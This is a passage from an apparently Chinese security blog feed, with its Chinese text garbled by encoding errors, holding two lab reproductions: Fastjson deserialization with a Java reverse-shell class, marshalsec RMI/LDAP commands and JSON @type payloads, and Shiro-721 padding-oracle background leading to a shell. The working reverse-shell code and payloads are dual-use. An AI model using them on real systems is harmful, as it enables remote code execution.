<h4 id="RMIæ–¹å¼"><a href="#RMIæ–¹å¼" class="headerlink" title="RMIæ–¹å¼"></a>RMIæ–¹å¼</h4><h5 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h5><ol>
<li>é¶æœºä¸ºvulhub8090ç«¯å£</li>
<li>kaliä¸Šåˆ©ç”¨pythonå¼€å¯webæœåŠ¡ï¼Œå¹¶æŠŠç¼–è¯‘åçš„expæ”¾åˆ°é‡Œé¢</li>
<li>kali 8001ç«¯å£å¼€å¯ rmi æœåŠ¡ï¼ˆrmi è¿œç¨‹æ–¹æ³•è°ƒç”¨  Aä¸»æœºå»è°ƒç”¨Bä¸»æœºä¸Šçš„exp.classæ–¹æ³•ï¼‰</li>
<li>kali 8888ç«¯å£ç›‘å¬åå¼¹çš„shell</li>
</ol>
<h5 id="ä½¿ç”¨kaliæ­å»ºä¸€ä¸ªä¸´æ—¶webæœåŠ¡"><a href="#ä½¿ç”¨kaliæ­å»ºä¸€ä¸ªä¸´æ—¶webæœåŠ¡" class="headerlink" title="ä½¿ç”¨kaliæ­å»ºä¸€ä¸ªä¸´æ—¶webæœåŠ¡"></a>ä½¿ç”¨kaliæ­å»ºä¸€ä¸ªä¸´æ—¶webæœåŠ¡</h5><p><code>python3 -m http.server 9999</code></p>
<h5 id="ç¼–è¯‘ç”Ÿäº§exp-æ”¾åœ¨webç›®å½•ä¸‹"><a href="#ç¼–è¯‘ç”Ÿäº§exp-æ”¾åœ¨webç›®å½•ä¸‹" class="headerlink" title="ç¼–è¯‘ç”Ÿäº§exp,æ”¾åœ¨webç›®å½•ä¸‹"></a>ç¼–è¯‘ç”Ÿäº§exp,æ”¾åœ¨webç›®å½•ä¸‹</h5><p>Exploit.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exploit</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp; /dev/tcp/192.168.20.129/8888 0&gt;&amp;1&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] argv)</span>&#123;</span><br><span class="line">        <span class="type">Exploit</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Exploit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿›è¡Œç¼–è¯‘<code>javac Exploit.java</code>ç”ŸæˆExploit.class</p>
<p>æŠŠç¼–è¯‘å¥½çš„Exploit.classæ”¾åœ¨kaliä¸Š</p>
<h5 id="kaliç›‘å¬8888ç«¯å£"><a href="#kaliç›‘å¬8888ç«¯å£" class="headerlink" title="kaliç›‘å¬8888ç«¯å£"></a>kaliç›‘å¬8888ç«¯å£</h5><p><code>nc -lvvp 8888</code></p>
<h5 id="å¯åŠ¨RMIæœåŠ¡"><a href="#å¯åŠ¨RMIæœåŠ¡" class="headerlink" title="å¯åŠ¨RMIæœåŠ¡"></a>å¯åŠ¨RMIæœåŠ¡</h5><p>ä½¿ç”¨marshalsecé¡¹ç›®ï¼Œå¯åŠ¨RMIæœåŠ¡ï¼Œç›‘å¬8001ç«¯å£å¹¶åŠ è½½è¿œç¨‹ç±»Exploit.class(marshalsecå’Œç¼–è¯‘åçš„Exploit.classæ”¾åœ¨åŒä¸€ç›®å½•ä¸‹)</p>
<p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.20.129:9999/#Exploit&quot; 8001</code></p>
<blockquote>
<p>kali@kali2020:~/Common/fastjson$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer â€œ<a href="http://192.168.20.129:9999/#Exploit&quot;">http://192.168.20.129:9999/#Exploit&quot;</a> 8001<br>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</p>
<ul>
<li>Opening JRMP listener on 8001<br>Have connection from /192.168.20.128:49126<br>Reading messageâ€¦<br>Is RMI.lookup call for Exploit 2<br>Sending remote classloading stub targeting <a href="http://192.168.20.129:9999/Exploit.class">http://192.168.20.129:9999/Exploit.class</a><br>WARNING: An illegal reflective access operation has occurred<br>WARNING: Illegal reflective access by marshalsec.util.Reflections (file:/home/kali/Common/fastjson/marshalsec-0.0.3-SNAPSHOT-all.jar) to field com.sun.jndi.rmi.registry.ReferenceWrapper.wrappee<br>WARNING: Please consider reporting this to the maintainers of marshalsec.util.Reflections<br>WARNING: Use â€“illegal-access=warn to enable warnings of further illegal reflective access operations<br>WARNING: All illegal access operations will be denied in a future release<br>Closing connection</li>
</ul>
</blockquote>
<p>åŸå› è²Œä¼¼æ˜¯å› ä¸ºjavaç‰ˆæœ¬è¿‡é«˜ï¼Œè¿™é‡Œé»˜è®¤ä½¿ç”¨çš„æˆ‘æ˜¨å¤©åˆšå®‰è£…çš„javac11,æ¢ä¸€ä¸ªä½ç‰ˆæœ¬çš„javacå»è¿›è¡Œç¼–è¯‘,ä½†æ˜¯è¿˜æ˜¯æ— æ³•åå¼¹shell.</p>
<p>æŸ¥äº†åŠä¸ªä¸‹åˆï¼Œæœ€ç»ˆå‘ç°æ˜¯å› ä¸ºkali çš„javaç‰ˆæœ¬é—®é¢˜ï¼ŒkaliåŸjavaç‰ˆæœ¬ä¸ºjava11,ç„¶åå®‰è£…äº†java8 å†å»å¼€å¯rmiæœåŠ¡å°±æ­£å¸¸äº†</p>
<p><img src="/posts/37afa0e0/rmi1.png"></p>
<p>æˆåŠŸåå¼¹shell</p>
<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>1.2.24 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://192.168.20.129:8001/Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>1.2.47</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://192.168.20.129:8001/Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="LDAPæ–¹å¼"><a href="#LDAPæ–¹å¼" class="headerlink" title="LDAPæ–¹å¼"></a>LDAPæ–¹å¼</h4><p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://192.168.20.129:9999/#Exploit&quot; 8002</code></p>
<p><img src="/posts/37afa0e0/ldap1.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;ldap://192.168.20.129:8002/Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://www.cnblogs.com/chen-w/p/14735881.html">https://www.cnblogs.com/chen-w/p/14735881.html</a></p>
<p><a href="https://blog.csdn.net/weixin_45556536/article/details/109486621">https://blog.csdn.net/weixin_45556536/article/details/109486621</a></p>
<p><a href="https://choge.top/2020/10/12/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://choge.top/2020/10/12/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></p>
<p><a href="https://www.cnblogs.com/hei-zi/p/13274272.html">https://www.cnblogs.com/hei-zi/p/13274272.html</a></p>
<p><a href="https://www.yuque.com/naraku/blog/leak-fastjson">https://www.yuque.com/naraku/blog/leak-fastjson</a></p>
</blockquote>
]]></content>
      <categories>
        <category>ååºåˆ—åŒ–</category>
      </categories>
      <tags>
        <tag>ååºåˆ—åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>Shiro721å¤ç°</title>
    <url>/posts/700536f4/</url>
    <content><![CDATA[<h3 id="æ¼æ´è¯´æ˜"><a href="#æ¼æ´è¯´æ˜" class="headerlink" title="æ¼æ´è¯´æ˜"></a>æ¼æ´è¯´æ˜</h3><p>shiroé‡‡ç”¨äº†AES-128-CBCçš„æ¨¡å¼å¯¹cookieè¿›è¡ŒåŠ å¯†ï¼Œè¿™ç§åŠ å¯†æ–¹å¼å¯ä»¥ä½¿ç”¨Padding Oracle Attack( Oracle å¡«å……æ”»å‡» ) ,ç”¨æˆ·å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼æ„é€ æ¶æ„çš„RememberMeå­—æ®µï¼Œå¹¶é‡æ–°è¯·æ±‚ç½‘ç«™ï¼Œè¿›è¡Œååºåˆ—åŒ–æ”»å‡»ï¼Œä»è€Œè¾¾åˆ°ä»»æ„ä»£ç æ‰§è¡Œ.</p>
<p>å½±å“ç‰ˆæœ¬: Apache Shiro  1.2.5, 1.2.6, 1.3.0, 1.3.1, 1.3.2, 1.4.0-RC2, 1.4.0, 1.4.1ç‰ˆæœ¬</p>
<br>

<br>

<h3 id="AESåŠ å¯†"><a href="#AESåŠ å¯†" class="headerlink" title="AESåŠ å¯†"></a>AESåŠ å¯†</h3><p>AES/128/CBC/PKCS5Padding åŠ å¯†</p>
<p>AESæ˜¯ä¸€æ¬¾å¯¹ç§°åŠ å¯† ,åˆ†ç»„åŠ å¯†ç®—æ³•ï¼Œè¿™ä¸ªä¹¦ä¸Šæœ‰ä»‹ç»è¿‡ï¼Œä¸è¿‡æœ€è¿‘ä¹¦æ²¡åœ¨æ—è¾¹ï¼Œå‚è€ƒäº†ä¸‹å¸ˆå‚…ä»¬åšå®¢ </p>
<p><a href="https://blog.csdn.net/qq_28205153/article/details/55798628">https://blog.csdn.net/qq_28205153/article/details/55798628</a></p>
<p><a href="https://www.cxyxiaowu.com/3239.html">https://www.cxyxiaowu.com/3239.html</a></p>
<h4 id="åŸºæœ¬ç»“æ„"><a href="#åŸºæœ¬ç»“æ„" class="headerlink" title="åŸºæœ¬ç»“æ„"></a>åŸºæœ¬ç»“æ„</h4><p>AESçš„åŠ å¯†æ ‡å‡†ä¸­ï¼Œæ¯ä¸ªåˆ†ç»„çš„ é•¿åº¦å›ºå®šä¸º128bits(16Bytes)ï¼Œå¯†é’¥é•¿åº¦ä¸º128bits,192bits,256bits,ä¸åŒçš„å¯†é’¥é•¿åº¦æœ‰ä¸åŒçš„åŠ å¯†è½®æ•°,æ ¹æ®é•¿åº¦ä¸åŒå¯ä»¥åˆ†ä¸ºAES-128,AES-192,AES-256.</p>
<table>
<thead>
<tr>
<th>AESåŠ å¯†</th>
<th>å¯†é’¥é•¿åº¦</th>
<th>åˆ†ç»„é•¿åº¦</th>
<th>åŠ å¯†è½®æ•°</th>
</tr>
</thead>
<tbody><tr>
<td>AES-128</td>
<td>128bits</td>
<td>128bits</td>
<td>10</td>
</tr>
<tr>
<td>AES-192</td>
<td>192bits</td>
<td>128bits</td>
<td>12</td>
</tr>
<tr>
<td>AES-256</td>
<td>256bits</td>
<td>128bits</td>
<td>14</td>
</tr>
</tbody></table>
<h4 id="åŠ å¯†æ­¥éª¤"><a href="#åŠ å¯†æ­¥éª¤" class="headerlink" title="åŠ å¯†æ­¥éª¤"></a>åŠ å¯†æ­¥éª¤</h4><p>åˆå§‹è½®        </p>
<ul>
<li>è½®å¯†é’¥åŠ ï¼ˆAddRoundKeyï¼‰</li>
</ul>
<p>æ™®é€šè½®        </p>
<ul>
<li>å­—èŠ‚æ›¿æ¢    ï¼ˆSubBytesï¼‰</li>
<li>è¡Œä½ç§»ï¼ˆShiftRowsï¼‰</li>
<li>åˆ—æ··æ·†ï¼ˆMixColumnsï¼‰</li>
<li>è½®å¯†é’¥åŠ ï¼ˆAddRoundKeyï¼‰</li>
</ul>
<p>æœ€ç»ˆè½®        </p>
<ul>
<li>å­—èŠ‚æ›¿æ¢ ï¼ˆSubBytesï¼‰</li>
<li>è¡Œä½ç§» ï¼ˆShiftRowsï¼‰</li>
<li>è½®å¯†é’¥åŠ ï¼ˆAddRoundKeyï¼‰</li>
</ul>
<p>å…·ä½“åŠ å¯†æ­¥éª¤è¯¦è§£å¦‚ä¸‹</p>
<h5 id="å­—èŠ‚æ›¿æ¢ï¼ˆSubBytesï¼‰"><a href="#å­—èŠ‚æ›¿æ¢ï¼ˆSubBytesï¼‰" class="headerlink" title="å­—èŠ‚æ›¿æ¢ï¼ˆSubBytesï¼‰"></a>å­—èŠ‚æ›¿æ¢ï¼ˆSubBytesï¼‰</h5><p>AES å­—èŠ‚æ›¿æ¢çš„è¿‡ç¨‹å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªæŸ¥è¡¨çš„è¿‡ç¨‹,AESæä¾›äº†Sç›’å’Œé€†Sç›’ï¼Œ</p>
<p>å­—èŠ‚çš„é«˜å››ä½ä½œä¸ºè¡Œï¼Œå­—èŠ‚åº•å››ä½ä¸ºåˆ—å€¼ï¼Œç„¶åæ ¹æ®sç›’ä¸­çš„å¯¹åº”çš„å€¼ä½œä¸ºè¾“å‡ºï¼Œå›¾ä¸­ç»™å‡ºä¾‹å¦‚ï¼ŒåŠ å¯†æ—¶è¾“å‡ºçš„å­—èŠ‚S1ä¸º0x12ï¼ŒæŸ¥Sç›’çš„ç¬¬1è¡Œ ï¼Œç¬¬2åˆ—ï¼Œå¾—åˆ°çš„å€¼ä¸º 0xc9</p>
<p>0xABï¼ŒæŸ¥Sç›’ç¬¬Aè¡Œï¼Œç¬¬Båˆ—ï¼Œå¾—åˆ°å€¼ä¸º0x62</p>
<p><img src="/posts/700536f4/s.png"></p>
<p><img src="/posts/700536f4/%5Es.png"></p>
<p><img src="/posts/700536f4/SubBytes.png"></p>
<p><img src="/posts/700536f4/SubBytes2.png"></p>
<h5 id="è¡Œä½ç§»ï¼ˆShiftRowsï¼‰"><a href="#è¡Œä½ç§»ï¼ˆShiftRowsï¼‰" class="headerlink" title="è¡Œä½ç§»ï¼ˆShiftRowsï¼‰"></a>è¡Œä½ç§»ï¼ˆShiftRowsï¼‰</h5><p>è¡Œä½ç§»ï¼Œå¯ä»¥ç†è§£ä¸ºå·¦å¾ªç¯ç§»ä½çš„æ“ä½œ</p>
<p><img src="/posts/700536f4/ShiftRows.png"></p>
<p><img src="/posts/700536f4/ShiftRows2.PNG"></p>
<p>è¡Œä½ç§»çš„é€†å˜æ¢ç›¸åï¼Œä¸ºå·¦å¾ªç¯ä½ç§»</p>
<h5 id="åˆ—æ··æ·†ï¼ˆMixColumnsï¼‰"><a href="#åˆ—æ··æ·†ï¼ˆMixColumnsï¼‰" class="headerlink" title="åˆ—æ··æ·†ï¼ˆMixColumnsï¼‰"></a>åˆ—æ··æ·†ï¼ˆMixColumnsï¼‰</h5><p>åˆ—æ··åˆå˜æ¢  å°±æ˜¯çŸ©é˜µç›¸ä¹˜,è¡Œä½ç§»åçš„çŠ¶æ€çŸ©é˜µç›’å›ºå®šçŸ©é˜µç›¸ä¹˜</p>
<p><img src="/posts/700536f4/MixColumns.png"></p>
<h5 id="è½®å¯†é’¥åŠ ï¼ˆAddRoundKeyï¼‰"><a href="#è½®å¯†é’¥åŠ ï¼ˆAddRoundKeyï¼‰" class="headerlink" title="è½®å¯†é’¥åŠ ï¼ˆAddRoundKeyï¼‰"></a>è½®å¯†é’¥åŠ ï¼ˆAddRoundKeyï¼‰</h5><p>è½®å¯†é’¥åŠ æ—¶iå°†128ä¸ºçš„è½®å¯†é’¥Kiå’Œç›¸åŒçŠ¶æ€çš„çŸ©é˜µä¸­çš„æ•°æ®é€ä½è¿›è¡Œå¼‚æˆ–è¿ç®—</p>
<p><img src="/posts/700536f4/AddRoundKey.png"></p>
<p>a[i,j]ä¸k[i,j]å¼‚æˆ–ï¼Œè¾“å‡ºb[i,j]</p>
<br>

<h4 id="åŠ å¯†æ¨¡å¼"><a href="#åŠ å¯†æ¨¡å¼" class="headerlink" title="åŠ å¯†æ¨¡å¼"></a>åŠ å¯†æ¨¡å¼</h4><p>AESåˆ†ç»„åŠ å¯†çš„åŠ å¯†æ¨¡å¼ï¼Œå…±äº”ç§å¯é€‰åŠ å¯†æ¨¡å¼</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ECS ( Electronic Codebook Book , ç”µè¯æœ¬æ¨¡å¼ )</span><br><span class="line">CBC ( Cipher Block Chaining , å¯†ç åˆ†ç»„é“¾æ¥æ¨¡å¼ )</span><br><span class="line">CTR ( Counter , è®¡ç®—å™¨æ¨¡å¼ )</span><br><span class="line">CFB ( Cipher FeedBack , å¯†ç åé¦ˆæ¨¡å¼ )</span><br><span class="line">OFB ( Output FeedBack , è¾“å‡ºåé¦ˆæ¨¡å¼ )</span><br></pre></td></tr></table></figure>

<p>åœ¨shiroä¸­ä½¿ç”¨çš„ä¸ºCBCçš„åŠ å¯†æ¨¡å¼ï¼Œ</p>
<blockquote>
<p>CBCåŠ å¯†æ¨¡å¼: å°†æ˜æ–‡åˆ‡åˆ†æˆè‹¥å¹²å°æ®µ , ç„¶åæ¯ä¸€æ®µåˆ†åˆ«ä¸ä¸Šä¸€æ®µçš„å¯†æ–‡è¿›è¡Œå¼‚æˆ–è¿ç®— , å†ä¸å¯†é’¥è¿›è¡ŒåŠ å¯† , ç”Ÿæˆæœ¬æ®µæ˜æ–‡çš„å¯†æ–‡ , è¿™æ®µå¯†æ–‡ç”¨äºä¸‹ä¸€æ®µæ˜æ–‡çš„åŠ å¯†</p>
<p>ç¬¬ä¸€æ®µæ˜æ–‡æ²¡æœ‰å¯¹åº”çš„å¯†æ–‡ï¼Œä¿è¯åˆ†ç»„çš„å”¯ä¸€æ€§ï¼ŒCBCåŠ å¯†æ¨¡å¼ä½¿ç”¨äº†åˆå§‹åŒ–å‘é‡ï¼ˆIV , Initialization Vectorï¼‰åˆå§‹åŒ–å‘é‡æ˜¯ä¸€ä¸ªå›ºå®šé•¿åº¦çš„éšæœºæ•° , è¯¥å‘é‡ä¼šä½œä¸ºå¯†æ–‡ç¬¬ä¸€ä¸ªå— , éšå¯†æ–‡ä¸€åŒä¼ è¾“ .</p>
<p>åœ¨ CBC æ¨¡å¼ä¸­ , åˆå§‹åŒ–å‘é‡( IV ) çš„é•¿åº¦ä¸åˆ†ç»„å¤§å°ç›¸åŒ , ä¸º 16 Bytes( 128 bits ) , å› ä¸ºé“¾æ¥æ¨¡å¼ä¸­çš„å¼‚æˆ–æ“ä½œæ˜¯ç­‰é•¿æ“ä½œ</p>
</blockquote>
<p><img src="/posts/700536f4/aes_Cbc_encryption-squashed.jpg"></p>
<p><img src="/posts/700536f4/aes_Cbc_decryption.png"></p>
<h5 id="åŠ å¯†æ¨¡å¼å¯¹åº”çš„å¡«å……æ–¹å¼"><a href="#åŠ å¯†æ¨¡å¼å¯¹åº”çš„å¡«å……æ–¹å¼" class="headerlink" title="åŠ å¯†æ¨¡å¼å¯¹åº”çš„å¡«å……æ–¹å¼"></a>åŠ å¯†æ¨¡å¼å¯¹åº”çš„å¡«å……æ–¹å¼</h5><p>å¡«å……æœ‰å…­ç§ï¼šNoPadding, PKCS#5, PKCS#7, ISO 10126, ANSI X9.23å’ŒZerosPadding</p>
<ul>
<li><p>Nopadding</p>
<p>  ä¸è¿›è¡Œå¡«å……</p>
</li>
<li><p>PKCS#7 &amp; PKCS#5</p>
<p>  ç¼ºå°‘å‡ ä¸ªå­—èŠ‚å°±å¡«å……å‡ ä¸ªå­—èŠ‚ï¼Œå€¼ä¸ºå¡«å……çš„å­—èŠ‚æ•°  </p>
</li>
</ul>
<blockquote>
<p>ä¾‹å¦‚,AAAAAAAA  BBBBBBBB CCCCCCCC    åˆšå¥½åˆ†æˆ3ä¸ªåˆ†ç»„<br>        AAAAAAAA  BBBBBBBB CCCCC            ç¼ºå°‘3ä¸ªå­—èŠ‚ æ‰€ä»¥ä½¿ç”¨ 0x03è¿›è¡Œå¡«å……<br>       (è¿™é‡Œä¾‹å­çš„A B C å‡è§†ä¸ºä¸€ä¸ªå­—èŠ‚)</p>
</blockquote>
<blockquote>
<p>ä¸åŒåœ¨äºPKCS5é™å®šäº†å—å¤§å°ä¸º8bytesè€ŒPKCS7æ²¡æœ‰é™å®šï¼Œåœ¨AESåŠ å¯†å½“ä¸­ä¸¥æ ¼æ¥è¯´æ˜¯ä¸èƒ½ä½¿ç”¨pkcs5çš„ï¼Œå› ä¸ºAESçš„å—å¤§å°æ˜¯16bytesè€Œpkcs5åªèƒ½ç”¨äº8bytesï¼Œé€šå¸¸æˆ‘ä»¬åœ¨AESåŠ å¯†ä¸­æ‰€è¯´çš„pkcs5æŒ‡çš„å°±æ˜¯pkcs7ï¼    â€”-åœ¨çŸ¥ä¹ä¸Šçœ‹åˆ°çš„</p>
</blockquote>
<ul>
<li><p>ISO 10126</p>
<p>  æœ€åä¸€ä¸ªå­—èŠ‚æ˜¯å¡«å……çš„å­—èŠ‚æ•°ï¼ˆåŒ…æ‹¬æœ€åä¸€å­—èŠ‚ï¼‰ï¼Œå…¶ä»–å…¨éƒ¨å¡«éšæœºæ•°</p>
</li>
</ul>
<blockquote>
<p>ç›´æ¥å¼•ç”¨å¸ˆå‚…çš„ä¾‹å­</p>
<p>â€¦ | DD DD DD DD DD DD DD DD | DD DD DD DD 81 A6 23 04 | â€¦ </p>
</blockquote>
<ul>
<li><p>ANSI X9.23</p>
<p>  å’ŒISO 10126å·®ä¸å¤šï¼Œæœ€åä¸€ä¸ªå­—èŠ‚æ˜¯å¡«å……çš„å­—èŠ‚æ•°ï¼ŒåŒºåˆ«åœ¨ è¿™ç§æ–¹æ³•å¡«å……çš„å…¶ä»–å­—èŠ‚éƒ½æ˜¯0ï¼Œè€Œä¸æ˜¯éšæœºæ•°</p>
</li>
<li><p>ZerosPadding</p>
<p>  ç¼ºå°‘çš„å­—èŠ‚å…¨éƒ¨ä½¿ç”¨ <code>0x00</code>å¡«å……</p>
</li>
</ul>
<br>

<h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>AESåŠ å¯†å¤§ä½“ä¸Šæœ‰æ‰€äº†è§£äº†ï¼Œå†å›åˆ°shiroä¸Šæ¥ï¼Œçœ‹ä¸€ä¸‹ AES/CBC/PKCS5Padding å³å¯</p>
<p><img src="/posts/700536f4/PKCS5Padding.png"></p>
<br>

<h4 id="Padding-Oracle-Attack-å¡«å……-Oracle-æ”»å‡»"><a href="#Padding-Oracle-Attack-å¡«å……-Oracle-æ”»å‡»" class="headerlink" title="Padding Oracle Attack( å¡«å…… Oracle æ”»å‡» )"></a>Padding Oracle Attack( å¡«å…… Oracle æ”»å‡» )</h4><p>æ˜¯æŒ‡ä½¿ç”¨å¯†æ–‡çš„å¡«å……éªŒè¯ä¿¡æ¯æ¥è¿›è¡Œè§£å¯†çš„æ”»å‡»æ–¹æ³•,ä¹Ÿå°±æ˜¯é€šè¿‡åŠ å¯†æ•°æ®è§£å¯†åéªŒè¯å¡«å……æ˜¯å¦æ­£ç¡®çš„æ–¹å¼</p>
<p>ä¾‹å¦‚</p>
<p>ç”¨æˆ·å»è¯·æ±‚ <code>http://www.example.com?id=xxxxxxxxxxx</code></p>
<p>æœåŠ¡ç«¯æ¥æ”¶å®¢æˆ·ç«¯å‘é€çš„æ•°æ®åï¼Œä¼šå¯¹å‚æ•°å€¼è¿›è¡ŒAESè§£å¯†å¤„ç†:</p>
<ul>
<li>å¯†æ–‡æ— æ•ˆ        =&gt;    ç”¨æˆ·ä¸å­˜åœ¨ã€‚è¿”å›http 500</li>
<li>å¯†æ–‡æœ‰æ•ˆ,å¡«å……æœ‰æ•ˆ        =&gt;    ç”¨æˆ·å­˜åœ¨ï¼Œç™»é™†æˆåŠŸã€‚è¿”å›htto 200</li>
<li>å¯†æ–‡æœ‰æ•ˆ,å¡«å……æ— æ•ˆ        =&gt;    è‡ªå®šä¹‰æŠ¥é”™ã€‚è¿”å›http 30X</li>
</ul>
<p>æ‰€ä»¥å¯ä»¥é€šè¿‡å¯¹å¡«å……è¿›è¡Œçˆ†ç ´æ¥ç¡®å®šæœ‰æ•ˆçš„å¡«å……å€¼</p>
<br>

<p><img src="/posts/700536f4/aes_Cbc_decryption.png"></p>
<p>Ciphertexté€šè¿‡Keyè§£å¯†ä¸ºMidvalue,ç„¶åmidvalueå’ŒIVè¿›è¡Œå¼‚æˆ–å¤„ç†å¾—åˆ°Plaintext</p>
<p>é‚£å¯ä»¥å»åˆ›å»ºä¸€ä¸ªFuzzIV è®©å®ƒä¸Midvalueè¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œå¾—åˆ°Plaintextåå†å»éªŒè¯å¡«å……æ˜¯å¦æœ‰æ•ˆ</p>
<p>PKCS5Padding ä¸­ paddingçš„æœ‰æ•ˆèŒƒå›´ä¸º0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 åˆ° 0x08 0x08 0x08 0x08 0x08 0x08 0x08 0x08 ä¹‹é—´</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FuzzIV[i] ^ Midvalue[i] = 0x01  =&gt; Midvalue[i] = FuzzIV[i] ^ 0x01</span><br><span class="line"> ===&gt;</span><br><span class="line">IV[i] ^ Midvalue[i] = Plaintext[i] =&gt; Plaintext[i] = IV[i] ^ FuzzIV[i] ^ 0x01</span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆå¾—åˆ° <code>Plaintext[i] = IV[i] ^ FuzzIV[i] ^ 0x01</code>, è€ŒIVå’ŒFuzzIVæ˜¯å·²çŸ¥çš„ï¼Œæ‰€ä»¥å¯ä»¥å¾—åˆ°Plaintextçš„å€¼,è¿™å°±æ˜¯ Padding Oracle Attack çš„æ”»å‡»åŸç†</p>
<br>

<h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><h4 id="æ¼æ´æ­å»º"><a href="#æ¼æ´æ­å»º" class="headerlink" title="æ¼æ´æ­å»º"></a>æ¼æ´æ­å»º</h4><p>è·å–dockfile</p>
<p><code>git clone https://github.com/3ndz/Shiro-721.git</code><br><code>cd Shiro-721/Docker</code></p>
<p>æ„å»ºå¹¶è¿è¡Œ</p>
<p><code>docker build -t shiro-721 .  </code></p>
<p><code>docker run -p 8080:8080 -d shiro-721</code></p>
<p>å°è¯•ç™»å½•  root/secretï¼Œå‹¾é€‰RememberMe</p>
<p><img src="/posts/700536f4/login_success_rem.png"></p>
<p>å¯ä»¥çœ‹åˆ° <code>Set-Cookie: rememberMe=deleteMe</code></p>
<br>

<h4 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h4><p>ä½¿ç”¨burpæŠ“å–rememberMe</p>
<p><img src="/posts/700536f4/exp1.png"></p>
<p>éœ€è¦çˆ†ç ´å¾ˆé•¿æ—¶é—´â€¦ â€¦ç”¨äº†åŠä¸ªå¤šå°æ—¶â€¦</p>
<p><img src="/posts/700536f4/exp2.png"></p>
<p><img src="/posts/700536f4/exp3.png"></p>
<p>æœ€ç»ˆæˆåŠŸåå¼¹shell</p>
<br>

<h3 id="æ¼æ´é˜²å¾¡"><a href="#æ¼æ´é˜²å¾¡" class="headerlink" title="æ¼æ´é˜²å¾¡"></a>æ¼æ´é˜²å¾¡</h3><ul>
<li>å‡çº§ Shiroç‰ˆæœ¬</li>
<li>ä½¿ç”¨wafæ‹¦æˆªè¿‡äºé¢‘ç¹è®¿é—®çš„ip</li>
<li>ä½¿ç”¨wafæ‹¦æˆªCookieä¸­é•¿åº¦è¿‡å¤§çš„RememberMeå€¼</li>
<li>å‡çº§jdkç‰ˆæœ¬</li>
</ul>
<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
